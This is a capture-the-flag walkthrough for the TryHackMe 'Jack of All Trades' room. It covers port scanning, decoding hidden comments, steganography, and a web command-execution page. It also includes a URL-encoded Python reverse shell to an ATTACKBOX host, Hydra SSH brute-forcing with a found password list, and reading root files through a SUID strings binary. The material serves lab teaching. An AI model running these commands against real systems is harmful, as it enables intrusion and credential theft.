# Jack of All Trades Walkthrough

Room: https://tryhackme.com/room/jackofalltrades

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: [https://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/jackofalltrades.md)

---


This walkthrough follows the full path from initial enumeration to user access and privilege escalation. IP addresses have been replaced with:

- `TARGET` for the victim machine
- `ATTACKBOX` for the attacking machine
- Flags have been partially redacted.

---

## Initial enumeration

We start with a full TCP port scan, using service and OS detection.

```bash
nmap -p- -sS -T4 -sV -O TARGET
```

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-27 12:07 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for TARGET
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

The first trick is visible immediately. The common services are swapped:

- Port `22` is running HTTP
- Port `80` is running SSH

This matters because browsing to `http://TARGET:22` may be blocked by Firefox by default.

---

## Allow Firefox to browse to port 22

Firefox blocks some ports because they are normally used for other protocols. Since this CTF serves HTTP on port `22`, we need to allow that port in Firefox.

Open Firefox and go to:

```text
about:config
```

Search for:

```text
network.security.ports.banned.override
```

If it does not exist, create it as a string value.

Set the value to:

```text
22
```

Then browse to:

```text
http://TARGET:22
```

---

## Directory enumeration

Next, enumerate the web service running on port `22`.

```bash
gobuster dir -u http://TARGET:22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html,bak
```

```text
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET:22
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://TARGET:22/assets/]
/index.html           (Status: 200) [Size: 1605]
/.html                (Status: 403) [Size: 278]
/recovery.php         (Status: 200) [Size: 943]
/server-status        (Status: 403) [Size: 278]

===============================================================
Finished
===============================================================
Progress: 1091375 / 1091380 (100.00%)
```

The important findings are:

- `/index.html`
- `/assets/`
- `/recovery.php`

---

## Reviewing the homepage source

The homepage contains several clues, including comments and images.

```html
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like 
			this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

The first useful comment points us to the recovery page.

```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
```

The second comment contains Base64 encoded text.

```text
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

Decoding it gives us:

```text
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

This gives us a password candidate:

```text
u?WtKSraq
```

---

## Reviewing recovery.php

Opening the recovery page source shows another hidden comment.

```text
view-source:http://TARGET:22/recovery.php
```

```html
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

The string is not plain Base64. It decodes in layers:

1. Base32
2. Hex
3. ROT13

Decoded message:

```text
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

A CyberChef recipe for this is:

```text
https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Hex('Auto')ROT13(true,true,false,13)&input=R1EyVE9NUlhNRTNURU4zQkdaVERPTVJXR1VaREFOUlhHNDJUTVpKV0c0WkRBTlJYRzQyVE9NUlNHQTNUQU5SVkc0WkRPTUpYR0kzRENOUlhHNDNETVpKWEhFM0RNTVJRR1kzVE1NUlNHQTNET05aVkc0WkRFTUJXR1UzVEVOWlFHWVpETU9KWEdJM0RLTlRER0lZRE9PSldHSTNUSU5aV0dZWVRFTUJXTVUzREtOWlNHSVlET05KWEdZM1RDTlpSRzRaRE1NSlNHQTNERU5SUkdJWURNTlpYR1UzVEVNUlFHNDJUTU1SWE1FM1RFTlJUR1pTVE9OQlhHSVpEQ01SUUdVM0RFTUJYSEEzRENOUlNHWlFURU1CWEdVM0RFTlRCR0lZRE9NWldHSTNES05aVUc0WkRNTlpYR00zRFFOWlpHSVlETVlaV0dJM0RRTVJRR1pTVE1OSlhHSVpHR01SUUdZM0RNTVJTR0EzVEtOWlNHWTJUT01SU0c0M0RNTVJRR1pTVEVNQlhHVTNUTU5SUkdZM1RHWUpTR0EzR01OWldHWTNURVpKWEhFM0dHTVRHR01aRElOWldIRTJHR05CVUdNWkRJTlE&oeol=CR
```

---

## Following the stego clue

The short link redirects to a Stegosauria wiki page. Combined with the `stego.jpg` image on the homepage, this strongly suggests steganography.

The obvious image is `stego.jpg`, so we test it first. The previous found password u?WtKSraq is the passphrase

```bash
steghide extract -sf stego.jpg
```

```text
root@ATTACKBOX:~# steghide extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```

The extracted file contains a troll message:

```text
Hehe. Gotcha!

You're on the right path, but wrong image!
```

The page also has other images, including `header.jpg` and `jackinthebox.jpg`. Since the hint says the credentials are hidden on the homepage, we should check all homepage images, not just the one named `stego.jpg`.

```bash
steghide info header.jpg
```

```text
root@ATTACKBOX:~# steghide info header.jpg 
"header.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "cms.creds":
    size: 93.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Testing `jackinthebox.jpg` with the same approach does not work.

```bash
steghide info jackinthebox.jpg
```

```text
root@ATTACKBOX:~# steghide info jackinthebox.jpg 
"jackinthebox.jpg":
  format: jpeg
  capacity: 5.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

The extracted credentials file from `header.jpg` contains:

```bash
cat cms.creds
```

```text
root@ATTACKBOX:~# cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

---

## Logging into the recovery page

Using the credentials from `cms.creds`, log into:

```text
http://TARGET:22/recovery.php
```

Successful login redirects to:

```text
http://TARGET:22/nnxhweOV/index.php
```

The page gives us a command execution hint:

```text
GET me a 'cmd' and I'll run it for you Future-Jack.
```

This means the `cmd` GET parameter is executed server side.

---

## Testing command execution

Before sending a reverse shell, confirm which binaries exist on the target.

```text
http://TARGET:22/nnxhweOV/index.php?cmd=which%20bash
```

```text
GET me a 'cmd' and I'll run it for you Future-Jack. /bin/bash /bin/bash
```

```text
http://TARGET:22/nnxhweOV/index.php?cmd=which%20python
```

```text
GET me a 'cmd' and I'll run it for you Future-Jack. /usr/bin/python /usr/bin/python
```

```text
http://TARGET:22/nnxhweOV/index.php?cmd=which%20sh
```

```text
GET me a 'cmd' and I'll run it for you Future-Jack. /bin/sh /bin/sh
```

Python is available, so we can use a Python reverse shell.

---

## Getting a reverse shell

Start a listener on the AttackBox.

```bash
nc -lvnp 9001
```

Use the command execution endpoint to trigger a Python reverse shell back to the AttackBox.

```text
http://TARGET:22/nnxhweOV/index.php?cmd=export%20RHOST=%22ATTACKBOX%22;export%20RPORT=9001;python%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22/bin/sh%22)%27
```

Listener output:

```text
root@ATTACKBOX:~# nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on TARGET 42688
$ whoami
whoami
www-data
```

We now have a shell as `www-data`.

---

## Finding Jack's password list

Move into `/home` and list the directory.

```bash
pwd
ls -la
```

```text
$ pwd
pwd
/home
$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 29  2020 .
drwxr-xr-x 23 root root 4096 Feb 29  2020 ..
drwxr-x---  3 jack jack 4096 Feb 29  2020 jack
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
```

There is a readable password list at:

```text
/home/jacks_password_list
```

---

## Cracking SSH with Hydra

SSH is running on port `80`, so the Hydra target needs to include port `80`.

```bash
hydra -l jack -P jacks_password_list ssh://TARGET:80 -V
```

```text
root@ATTACKBOX:~# hydra -l jack -P jacks_password_list ssh://TARGET:80 -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-28 09:07:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://TARGET:80/
[ATTEMPT] target TARGET - login "jack" - pass "*hclqAzj+2GC+=0K" - 1 of 24 [child 0] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "eN<A@n^zI?FE$I5," - 2 of 24 [child 1] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "X<(@zo2XrEN)#MGC" - 3 of 24 [child 2] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass ",,aE1K,nW3Os,afb" - 4 of 24 [child 3] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "ITMJpGGIqg1jn?>@" - 5 of 24 [child 4] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "0HguX{,fgXPE;8yF" - 6 of 24 [child 5] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "sjRUb4*@pz<*ZITu" - 7 of 24 [child 6] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "[8V7o^gl(Gjt5[WB" - 8 of 24 [child 7] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "yTq0jI$d}Ka<T}PD" - 9 of 24 [child 8] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "Sc.[[2pL<>e)vC4}" - 10 of 24 [child 9] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "9;}#q*,A4wd{<X.T" - 11 of 24 [child 10] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "M41nrFt#PcV=(3%p" - 12 of 24 [child 11] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "GZx.t)H$&awU;SO<" - 13 of 24 [child 12] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass ".MVettz]a;&Z;cAC" - 14 of 24 [child 13] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "2fh%i9Pr5YiYIf51" - 15 of 24 [child 14] (0/0)
[ATTEMPT] target TARGET - login "jack" - pass "TDF@mdEd3ZQ(]hBO" - 16 of 24 [child 15] (0/0)
[80][ssh] host: TARGET   login: jack   password: xxxxxxxxxxxx>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-28 09:07:14
```

We now have Jack's SSH password.

---

## SSH as jack

Remember that SSH is on port `80`, not port `22`.

```bash
ssh jack@TARGET -p 80
```

```text
pingu@nootnoot:~$ ssh jack@TARGET -p 80
The authenticity of host '[TARGET]:80 ([TARGET]:80)' can't be established.
ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[TARGET]:80' (ED25519) to the list of known hosts.
jack@TARGET's password: 
jack@jack-of-all-trades:~$ whoami
jack
```

---

## User flag

Jack's home directory contains an image.

```bash
pwd
ls
```

```text
jack@jack-of-all-trades:~$ pwd
/home/jack
jack@jack-of-all-trades:~$ ls
user.jpg
```

Copy it back to the AttackBox.

```bash
scp -P 80 jack@TARGET:/home/jack/user.jpg ./user.jpg
```

Opening the image reveals the user flag.

```text
securi-tay2020_{p3ngu1n-hunt3r-...}
```

---

## Privilege escalation enumeration

Testing `sudo -l` does not give us an easy path, so we look for SUID binaries.

```bash
/usr/bin/find / -perm -u=s -type f -exec ls -lah {} \; 2>/dev/null
```

```text
-rwsr-xr-x 1 root root 455K Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 288K Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 11K Apr 15  2015 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 44K Nov 20  2014 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 53K Nov 20  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 39K Nov 20  2014 /usr/bin/newgrp
-rwsr-x--- 1 root dev 27K Feb 25  2015 /usr/bin/strings
-rwsr-xr-x 1 root root 147K Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 53K Nov 20  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 74K Nov 20  2014 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 88K Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root root 3.0M Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-x 1 root root 40K Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 27K Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root root 40K Nov 20  2014 /bin/su
```

The interesting binary is:

```text
/usr/bin/strings
```

It is owned by root, has the SUID bit set, and is executable by the `dev` group.

```text
-rwsr-x--- 1 root dev 27K Feb 25  2015 /usr/bin/strings
```

Now confirm that Jack is in the `dev` group.

```bash
id
```

```text
jack@jack-of-all-trades:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev)
```

Because `strings` runs with root privileges, Jack can use it to read files that normal users should not be able to read. This does not give a full root shell, but it is enough to read the root flag.

---

## Root flag

First, testing with `sudo` confirms Jack does not have sudo access.

```bash
sudo strings /root/root.txt
```

```text
jack@jack-of-all-trades:~$ sudo strings /root/root.txt
[sudo] password for jack: 
jack is not in the sudoers file.  This incident will be reported.
```

But running the SUID `strings` binary directly works.

```bash
strings /root/root.txt
```

```text
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32...}
```

Root flag:

```text
securi-tay2020_{6f125d32...}
```

---

## Summary

The main path was:

1. Discover swapped services with Nmap.
2. Browse HTTP on port `22` by allowing the port in Firefox.
3. Enumerate web content and find `/recovery.php`.
4. Decode the homepage Base64 note to get a password candidate.
5. Decode the recovery page comment using Base32, Hex, and ROT13.
6. Follow the steganography clue and check all homepage images.
7. Extract recovery credentials from `header.jpg` using `steghide`.
8. Log into the recovery page and find command execution.
9. Use Python command execution to get a reverse shell as `www-data`.
10. Find `jacks_password_list`.
11. Crack Jack's SSH password with Hydra against SSH on port `80`.
12. SSH in as `jack`.
13. Copy `user.jpg` and read the user flag from the image.
14. Find SUID `/usr/bin/strings`.
15. Use SUID `strings` to read `/root/root.txt`.
